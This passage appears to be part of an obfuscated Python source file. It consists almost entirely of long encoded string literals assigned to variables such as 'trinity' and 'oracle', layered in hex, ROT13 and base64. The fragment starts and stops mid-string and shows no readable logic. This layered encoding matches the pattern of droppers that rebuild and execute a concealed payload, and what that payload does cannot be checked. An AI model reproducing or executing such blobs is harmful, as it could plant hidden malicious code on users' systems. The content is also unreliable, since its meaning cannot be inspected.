cwNGY1ODM1NGQ0ODQ5MmI0YTM3MzQ2ODYyNmI0ZDc1NDYzNTY5NTIzOTUzNjE1NDRhMmY0NTU1NjM1MzRkNjc2NTU4NjY2Mjc2MzI2ODc5NDg0OTUxMmY3NzZkNTc3NzZkNjg2NjJiNDEzMzRkNjc1MDc3NjkzODUxNmUzNDZiNzU3ODQxNDU3NDc4Mzc2YTQ1NjIzODU3Nzg0NTZjNjU0Zjc4Nzg3MjQ4MzE2ODc2Mzg3YTUyMzczMjQzNjYzODMyMzI3OTc2NzM2OTQ3NGQ2Yjc4NzkzNzY5MzAzNjdhNzY0ZjJiNTE0NDVhNDgyYjczNjQzMjU0MzMzOTQ2MzY1MDY1NGE2MzZjNzQ0MjM3MzQ0ZTM5NDI0MjM4NzU0MjM4NjcyYjc5NTY3ODZhNTc1MTU4Nzg0MTY2MmI2YTZkNzU3NzQ5MzU0NDc5NDE3NDc4Njc0YzM1NDgyZjY3NGEyYjYzNjY3NzZhMmY2YzRmNjM3MzQ1NGM3NzZhMzk2MTRmMzczODZhNmQ2MjJmNDE1NDQ3NjM2NDU1Nzg0MTMzNmY0YTJmNDY3NTY5NjQzOTVhNmE3OTMzNmI0NDMwNTQ0ODJmNDIzNzVhNjI0ZDZlNmE0NTdhMmY0YTYyMzk0OTM0NGE0NjY2NTM2Yzc5NTY3MzY0NGQ3Njc4NmI2NDU5NDI0NzY5NjIzMjQ0Nzc2MjYyNzk3NzUyMzk2NzUwMmI2ZTY1NTM3MjQ1NGE0ZTRhMzc2YzJmNzk2YjQyNjYzNDRhNjU3MDM5NmE0YzMxMzM2ODcyMmI0MTdhNjk0MjJiNzM2YzMyNTI3NjczMmYyZjQ3NjQ3ODcyNDg1NzM2Nzk2NjM3NjE2NzZiNjU3MTQ1NTQ0YTY2Nzc2NDc5NTg3MzJmNzkyYjQ2MzI1MTU4Mzc1Nzc3N2EyYjdhMzM2MzMxMzU0Nzc2Nzc0MjM0Njg2ODc5NDg2NTY3Njg1ODYxNDY1ODY5NDczODUzMzk3MjVhNjcyYjU1Nzk3MzdhMzE2NzQ4MzI1Mzc2NzA2YTc3NTcyZjdhNjU3NDZlNjU3OTUxMzU0NzVhNDE3YTc4NjQ3MzM3MmY0ZDY5NTczNTU4NTY0MjJmNGY2ZjM1MmY2OTQ4NmU1OTU4MmI0ZDY1NDE2OTM5NDk3NjMyNDM1ODYzNDg0ZjYyMzg2YTMzNmY0MTRlNGQ3NjM4MzczMjQzNDg3NTY0MmI2MTQ0NDQ3NjZmNjc3NTJiNGM0ODc4NzQ3YTM2NTE1ODY1NmY1OTZhMmY0YzU0Njk3NjMwMzczNTYyNGY2NzZiMzI0ZDQzNTk2OTQ0Nzk1NzYyMzQ1NzJiNzU3NzY2NmI1MTJiNTM1NDU5NDE1MDY5NDY2MzRhMzg3MzdhNTE1OTQ4Mzc3OTUwNjY1MjRhNDc3MDc4MzM2Yjc2MmI2MTJmNTI1MDM4NzU3NTRiMzQ2YzMwNGY0ZjY5NGQzODU3MzU2MjY1NmI0MjdhNzY2ZjRiNjU2MzMzNmM0MTRlNGQ0YTY1NTM0NzY1NDk1YTM1NGU2NDY3NjIyYjMwMzI2ZDZhMmY1NDQ3Njg1NzM2NTE1NDZlNDM2MzZhNjUzNzczNzQ3YTY4NzUzNzczNmQ0Zjc3Njk1ODM4NjM1NTM3MzA0OTU0MzU3NTRmNTEyYjYyMzc1MjMzNzg2NzJmNTA3NjQ3MmY0OTM3Mzg2YTJiMzM0MzM4NmQ1NjM1NDg2NTQ0NzY2ZjYxN2E3NjZjNmE3Nzc5MmI0MTVhMmY0MTdhNzk1NjRjMzQ2OTJmNzk1MzJmNDk0ZjY1MzQ2YzY5NDQ2Njc5NDQ2ODY2NDkzMzcyNzA2ZTc2NTIzMDZhNzQ3NTZiNTAyYjUyNTg3MDZlNDE2NTRlMzY0NjM4MzUzNDU5NjM1MjYzNDM2NTQ0NTA1OTY2MzQ1MDc1NGUzODc5NDg1OTQ4NzU2NjU2Nzk0ODc0MzM0Njc1NjYzNTQ1MmY3NTZiNjk2NTUxNTA3NjMwNTQ3MjMyNjk1YTQ1NGMyZjZkNDg2ZTQ3NGQ1OTM2Njc2ZTM0Mzg0OTc2NGY3MzYzNjg2YzY2MzQ1NzM4NDI0YzJiNTQyZjU0MzIyZjc0N2E0MTZlMzg1OTQ4Nzk2YTY3NzgzNTRhMmY3NDRhNDc2ODJmMzU0MjY1Nzc0MjJiNTI1NDZlNTEzNzYyNDc2NDQ2NzAzNzM1NDQ0ZDQ3Mzk0ODU0NGM2NTUxNmUzODRkMmI0OTU4MzQ2YTU4Nzg2YTczNWE1Mjc5NTA3MzczMzg0MjU2MzU3ODM0NTg3YTUxNmU3YTQ4Mzg1OTRmMmY2NzVhNzc2YjM2NzcyZjMwNTQ0ZTMzNTk3Mjc4NGUzOTY5NTAyZjc3MzQyZjczNjU2NjZiNzE2ODQ0NmU0YzVhNzYzMjQ5NjQ0NTJmNzQ3YTc4NDM0ZDRjMmY3MDUwNmI1OTY2NDU3YTQ0NTg2ZDQ2NTk3Njc1NDc1ODUzNDI0ZjYzN2EzNjY5NzMzNzMxNTU2OTc2Njc0NDJiMzA0ODY0Njc2YTc3NTQzOTZjNjk0MTUwMzY1MjY2NzM0MzU3NzM0NTMzMzQ2NjRmNTEzNzQ4NDEzNDUwNzQ2OTRmNjk1OTM3NWE3YTY5NGU1MDZiNmQzNTRhMzI2ZjU5MzQ2ODY1MzA3NjY2Njk2ZDU0NjQ0MTUwNmI1MzU4NTI2NjM2NWE3ODczMmIzNDYyNmI0Nzc1NTQzMzRiNzQ2YjRiMzk0NDM2MzU0Nzc2NmY2MjM2NDEzMzM4NjUzNjQ5NDMyYjRmNmUzNDZhMzM2ZDRkMmY2YjJiNDU0ZDc4NDE2ZTc5NmIzNTc5NjIzNzUxNjM1MjQ4MzY0MTRmMmY2YTJmNzc0NjM4Mzg0YTUwNjgzOTQzNjY1YTJmN2E0Njc1NDY3OTMzN2E1ODcxNTI2ZjRkMzY3OTY5NTMzNjM2NjQzOTZkNGY2OTU2MzczNDU4NjE3OTcyNjg0NjJmNTU0ZDQzMmY0ODU2MmI1MTUyNjk0NDY2MzQ1MTM3MzU0ZTYzNTE1MTM1NGU2Njc3NjkzNTJiNzU2MzY0Nzk0NjY2NTk0MjMzNTQ0ZjYzMzk0NzRjNmI2ZTM2NDM3MDJiMzU1MjU2Mzc0MjYzNWE2MjdhNzc3YTZkNzY3ODc2Njc1NjMxMzM3NjQ1NmIyYjY1NTY2NDQzNTg2ZTRmNDY2ODc5NjY3MzM1MzE3ODRhNzcyZjQ3MmI3OTU4NDUyZjQxNTg2NDU5NTk0MzZlNTQ3MjdhMmYzMDVhMzY1MTJmNTY2ZTY4NzY3YTc1Njg2ZTY5NGY2NTY5NmM0NDQ4NjM0YTMxNDk3NjUzNTYzNjc3MzM0NTUyMzQ3Mjc2NzY0NTM3NTM0ODM5NTk2ZTM0NzYyYjRmMzgzMDY2NDU3NjM0N2EzMTRiNmQ2MzJmNjg1MDY5NDc3NTQ1NWEzNjc5NTA3MTRhNGY2YTRlNDg2NjZiNmE3NjQ1MzUyYjUyNjQzMDQ0NzYzNDYxNjM3NDMyNGMzOTQ1NzY2YjdhMzI0MTQ4MzI0MjJmNjM0ZjUwMzU3MjUwMmY2ZDUwNTY3YTZhNmU0ZDYzNWE3Nzc1NzUzNDMzNjc2NDU0MmYyYjUwNjQ1MzY5NGQ3YTMzNmY3ODc4MmY2NjVhNDg3NTQ2NzY0NjYzNjQ1MDM0NjczMzc5NTY1NjZmMmYzMDUxNTAzNzczNzU0NDZlNGM3MDQ0Mzc0NTZlNTUzOTM4Mzk3MDQ2NTg2YjY2NzI0OTZhMzE1MTQzNjU1NjU4NDY2Njc0NGE2YTYxMzgzMzM2NDM1MDc5NGEzOTQ0NDY2NDUxNmE1MDU0Mzc3NzZiMmY3OTU0NmU3NjRkN2E0ZTM1NzY3NzQ3Mzg2ZDRlMzk0YzY1NDgyZjM1Mzc3NzQ5Mzg2MzRlNDMzMzUyNzAzOTdhNDg1NTVhMzY3M'
trinity = 'GMuAGZmZmD0ZmZ2LmHlATZ3ZGZkAGH0Amp3AzH3AwD5ZzV2AmExZmZmZQH3ZmD2AmZmZmD2Amp0Amx0MQZ2A2R3AwExAQVlMwZlAwH3Awp5AGN2AQquAwV2Amp1AQDmZGMyAmH3ZmZjA2R2BQZ3ZmN0LmZ0AQRmBGZ1AwL1ZGEzZmD3BQZ1ZmN3AGHkAwH1BGD4Zmx2BGH4AzVlMwH5AzV0BGZ4Amt0BQZ0AQZ3AwMvAwD2AGHlAGN1Zwp4AGt1BGH4AmL2BGDkZmp0MwWvZmx2BGp2AQD1BQEyZmt0LmL1AJR2ZmL4AmL2ZmMwAQx0BQL2AzL0ZwZ5AwD2Awp5Zmp2LmWvZmV0ZmWzAzH2AwEvAzZ0ZGZ3ATV0Mwp4Awx1ZwZ5AwZ3BQZ0AGNlMwH2AQHmBQL3AGN2LmDmAwZmAGD0Amx1AwWzAGH0LGMzA2R0BQMvAGxmBQL3AmL2LwLlZmR3BQp2ZmL1Zwp5ZmZ3AGEyZmH0Awp2AQH0AwZ4AQx3ZwMwATL3BGD4AmL0ZGZ3Amt0AQZkAwH2MwWzZmL2LGp2ATH1ZGp4AQt1BQZ0AQx2ZGEvATHlLwHkAQtmBGZ0AmLmZQLmAmp1BQD3AQtmAmDkA2R3BGp2ATDmAmZ1AGD3LGMuAmV0ZGWzAQxmZGH3Awp2AGp2AzVmZmEvAzRmAmEuAzV3AwZ4AQDmAGHlAmt2AwH1ATVmAGp5ZmtmAGWzATR0MwLlAGN2AwEyAJR3BQD0ZzL2LwZlAwZ1AmH0AQtmZmp2ATL0LwWvAQD0LmH3ATLmBQpjA2R3BGD0Zmx3ZGZ1AQZ2MGLmAGNmZQZlZmpmAwExATD3AwEuZzV0ZwL2AGZ0LwH4Zmx1LGD4ZmZ1AwMyATV0LmZ1AQHlMwZlAmL0AGExAwH1AwpmAQt0AmpkAwZmAwp3AGx0MGL0AwZ3BGZ4ATD2AwMzAzDmAGDkAmL0Awp3AwpmAmpjAQR2AQEwAwH1BGZ0Amp0BQMvZmDmAGH2AGN0AGZkZmD3ZwquAwL3AQHmAmL2LmEzZmt2BQquZzV1BQZ2Amx0AmH0Zmx1ZGD4Amt0MQD5AQLmBQZkZmRlLwH2ATR2AmL1ZzL1LGplZmL0LGEzAwp1AQWvAGxmAGLmAwV3BQH0AwH0MGZ5AQx2AwDmATR3BQZjAGt3AGpmAwH2ZmZ4AwH1BGZ2AGD0AwWzAGx3LGH4ATH3ZmMyATL2AwH5AzH1AQExZmp3ZwLlAwx1BQZlAQDmZQquAGx0LGZ5AwZ1LGEyZmx2AmDlATV2MGD4AQx2BGL2ATH2AQH0AwL0AGWvAQR2ZwZ2AzR1ZQEvAQV0ZmL2AQR2LwEyA2R2MGH4AJR1ZQZlATRlMwDkAmL2LwpmAwZ2LmMyAmZ0MGp5AQL1ZQD0Awt2ZmZ4AGNlMwEuZmt3ZGp1AmHmZmZlAQH2AGMuAwZ2AGIuZmx0ZGHjAQR3ZwZ1AGN3BGEuZmDmZmWvAQZ3AGD5AQL2ZmZ0AQD2LwWzZmpmBGHjAzZmZwDlAwL1ZGIuAmtmZGD2AwV3AwHmAwZ0BQWzAGxmZQp3AwHlLwL3ATZ3ZwDmAwtlMwZ5Awt1ZQHkA2RmAGp3AGV1ZwZ2AmZlLwD2ZmNmAGZlAmp3AwH2ATR1Amp3AzH3ZmDkZzL2LwIuAwZ2LGMyAwH1AwZ4AQt2AGL2AzH0MQL4ZmxmZQL2AwLlMwZmATZmZGWvAwHmZGp2AzHmAwEyZmV0MGpjZmN3AwH1AGL2AGL1AJR1AGD5ZmR1ZmMuAwZ1ZwL4ATH3AGp2AmR0ZmWzAwx3AwZ0ZmNmZQH4ZzL2BQp1Awt1ZwL4AwV2MwpkZzV2MwH3AmH2LGplAGH1ZQEwAQL0AwEyAmp1AwZ3ZmZ2AQL5Zmt2MwquAGL0AGMuAmL1AwMwZmx2ZGZmAmD0MwZkZzL3LGEuAQH2ZGEyAQLmAmDlAmx0Mwp2Awp2LGEvAmL2ZmMyAGN3AQDlAzL2ZwMzZmL2Awp1AmpmAmH1AGR2AwMxAwV2MQEwAmZ1AQp4AGD1AwDkZmZ0MGZlZmx0ZmZ5AmD1ZwDkATR3LGL1AGLmAwZ5AQLmAGL3ZmN1ZQL3ATZ1AGHkAGp2ZGDmAzRmZmZ2AwL3ZGMuAzL3AGIuZmH1ZQDlZmp3ZGZmAQVmAmplAmR0MGDmAwVmBGH0AmL0MwZ2AGD1ZmMyAQZ1ZmDmATDmAwp2AmN2MGL1ATV2AmDmAmDmBGZ2AQZmZmquAQV3LGL2ZmxlLwpjAwV1AwEwAzDlLwL0AmHmZQp1AmV3AmZ0ZmN1LGZjAQRmZQD0AQV3ZwEyAGZmZwp2AQLlLwL4AGDmBGMyAmD0MwLmAGD1ZGMvZmLmZGMxAQL0LwHjAmDlLwMuZmx2ZGH4AwLmBGDmZmL0MGL3ZzL0AGDmATD3A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'
oracle = 'Q0NDM2Mzc2ZTJmNDU1NzQ1MmY2YTRmNjc2MzM3NmY3MjM1NjM2NzQyNzY0NjdhNmU3NjM5NTY2ZTU5NzAzNjRjNzg3MTUzMzQ0ODU0Mzc0Mzc2NDU1MDM3NzgzMTM3MzgzODc5NDc1MDY0N2E3NzdhNjE0ZTQ2NTc1MzQ0NTE3ODY4NTE2ZjczNjM0YzU2NDM0NzQ4MzM0MzRjMzE1ODc5MzI0OTY3NjQ0MTMxNGM0OTQ1NGM1MjY0NzMzMzY1NTk2YzYyMzI2YzYyNDk2MjY1NGY3NTU1NTg0YjU1NDk2ODUxMmY3NzMzNzgzNDcwNTk1OTMyNmM0NzQxNjk1MzU4NjM3MTZhNTU1YTM5NmY1NTc0Mzk3ODc0Mzk3ODM2MzA1Njc0NDQ3MTc3NDY2MzM5Nzc0ZDRkNDE2MzQxNGQzMTQxNzk3ODU0NTE0NjZiNDIzOTQyNmY1OTc5NmY1ODU3NDc2YzZhNzM2NzQ3Nzc3OTZjNDE2NjUxNDg1NzM3NjQzNzc3NDg3MDMwNjg2YzY2NjQ3MzQzNTc0ZDU2Njg1MTY3NDk0OTQzMzg0MTQ3NmY1ODY2NTg0MjcyNjczOTM4NzA2MTU0MzMzNTQ2NjQ0MzM1NTg1NDRhNDQ1MjUyNjk1NzU2NGYzMDMxNjg2NDU5NGE2NjMxNzYzMDYzMzY3NTU3MzE2ZDM4Mzk2ZjU3NzYzMDMzNTE3NzM1NTk0MzY3NmY1NzY3MzU2MTZhNjg1YTYzNjc2ODU5NTE1MTc4NDY0ZDYyNzQzMTUwNGU2OTQzNjY0ZjcyNjU0OTRhNzI1MTYxNzU0MzU1NDE0ZjQxNTQ1MjY1MmY2OTU5NDk1NjQzNDE2MzQxNDE2OTc4NzEzMDRhNDQ1NjQxNGUzODRhNDU2ODRkNGMzODY4NTk1MTdhMzUzNDM5NjEzNjJmNmQ3YTc4NmE3MzM4NTc0YjQ2NmY0MzQ2NTcyZjU2NzMzMzc3NzU3YTdhNWE2YTc4NjkzMTc3NTE0ZTRkNTU1NzcyNGY2NzZhMzY0NTQ2NjUzMzRlNzU0NzUxNDk1Mzc4NGU0MTRiNmU2MjY2NDk2MjM2NTUyYjUxMmY2ZDM0NWE1MTJiMzU0Nzc0Nzk3MTQxNTk1MTQyNGM1YTQxNjI1MTM1NDQ1MTc3NmI2NTRjNDY0ZTQ0NDU0YTM2NTE0ODYzNmY0MTY1NGQ0Mjc5NTUzNTVhNjc3ODY0NDk0ZTYyMzY1MTYxMzM0Yzc0NDY2MTcxMzU2Nzc2NjQzNDU5NDk0MTQ1NGM0YzcyNTE3OTQ3NTc2YTM2Njg1MDQ5NDQzMTY3NDMzNzQ5NDc3OTMxNDQ3MTU4NGY0YzY3Mzk2MzQyNjE0NTZiNDk0YjRlMzQ0ODU3NmM3NjYzNzk3MjU2NDEzNzc3Nzk1YTU5NmI2YTRjNGU0YzY2NDQ3NTQ4MzEyYjY3MmYzNjQ1NjMzNDc0NzYzNDcwNjE0MzY5NTI1YTM2Njg2YzU5NmUzMDYzNDg3YTRkNTg1NDc4Nzk1NzJiMzA3NTQzNjM3ODUxMzI3NDYzNzk0MjY5NzQ0NTMwNDI0MzM5NzY3MjYzNzE2YjQxNGMzNDU3NGE2YjY3NDUzNTc3NjU3NzUwNzY2ZjM5NTU1MDcxNGYzOTc2Nzk0YjU4Njk2NTM0NTk2NzYzNTc3NjZmNTE3NjcxNDc0ZTY4NTU2NzU2NzA0MzUwMzA0NjY4MmY2MjZjNjc1ODc0N2EzNzZmNzY1MzY1NTU2NzJiNjY2YzM3MzA2YTJmNDE0ZDM4NDMzOTQxNGI3NDUyNzI1MTczMzE0MTc3NDY1YTczNjc2NTMwNTg3MzcyN